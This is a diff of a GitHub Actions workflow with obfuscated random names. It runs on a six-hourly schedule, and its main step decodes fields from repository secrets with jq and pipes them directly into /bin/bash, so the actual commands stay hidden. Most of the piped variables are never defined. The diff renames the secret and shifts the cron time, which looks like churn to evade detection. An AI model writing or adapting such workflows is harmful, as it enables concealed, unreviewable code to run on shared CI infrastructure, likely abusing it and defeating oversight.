@@ -2,25 +2,18 @@ name: fengjiwai4433
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 2/6 * * *'
-jobs:  # 13735
+    - cron: '42 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fengjiwai4433
         env:
-          a2: ${{ secrets.a2 }}
+          oxrc89: ${{ secrets.oxrc89 }}
         run: |
-          echo $a2 | jq -r .x4 | /bin/bash
-          echo $gthwz6 | jq -r .pzuc71 | /bin/bash
-          echo $rq58377 | jq -r .ftrsv2 | /bin/bash
-          echo $aqp9 | jq -r .z6660 | /bin/bash
-          echo $t284 | jq -r .zd0 | /bin/bash
-          echo $de7305 | jq -r .qqdzm80 | /bin/bash
-          echo $kxyxl572 | jq -r .rrs48 | /bin/bash
-          echo $h9 | jq -r .qhcc40 | /bin/bash
-          echo $wicr4 | jq -r .kviuk199 | /bin/bash
-          echo $ksea373 | jq -r .zvjdg6 | /bin/bash
+          echo $oxrc89 | jq -r .ukwhe94466 | /bin/bash
+          echo $mmy46 | jq -r .okn2427 | /bin/bash
+          echo $kx58 | jq -r .qxjrw0 | /bin/bash
+          echo $txick82 | jq -r .p234 | /bin/bash
 
